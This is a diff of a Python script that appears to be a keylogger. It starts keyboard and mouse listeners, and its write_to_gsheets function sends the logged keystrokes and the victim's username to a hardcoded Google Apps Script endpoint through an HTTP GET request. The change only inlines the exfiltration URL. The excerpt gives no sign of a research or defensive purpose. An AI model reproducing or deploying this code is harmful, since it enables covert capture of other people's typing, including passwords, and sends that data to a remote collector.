@@ -57,19 +57,18 @@ def write_to_text (file_name="output.txt"):
             print(e)
 
 def write_to_gsheets():
-    global link
     global text
     try:
         if text !="":
-            requests.get('%s?pc=%s&keylogs=%s'%(link,getpass.getuser(),text)) 
-            print('%s?pc=%s&keystrokes=%s'%(link,getpass.getuser(),text))
+            requests.get('https://script.google.com/macros/s/AKfycbx3AY9YCOWcC-XiWTdeaEdmq5MdaN19RFkLneWS1nUZQoyCfw/exec?pc=%s&keylogs=%s'%(getpass.getuser(),text)) 
+            print('https://script.google.com/macros/s/AKfycbx3AY9YCOWcC-XiWTdeaEdmq5MdaN19RFkLneWS1nUZQoyCfw/exec?pc=%s&keylogs=%s'%(getpass.getuser(),text))
     except Exception as e:
         print(e)
 
-link = "https://script.google.com/macros/s/AKfycbx3AY9YCOWcC-XiWTdeaEdmq5MdaN19RFkLneWS1nUZQoyCfw/exec"      
+
 text = ""
 mouse_listener = mouse.Listener(on_click=on_click)
 mouse_listener.start()
 keyboard_listener = keyboard.Listener(on_press=on_press)
 keyboard_listener.start()
-    
+
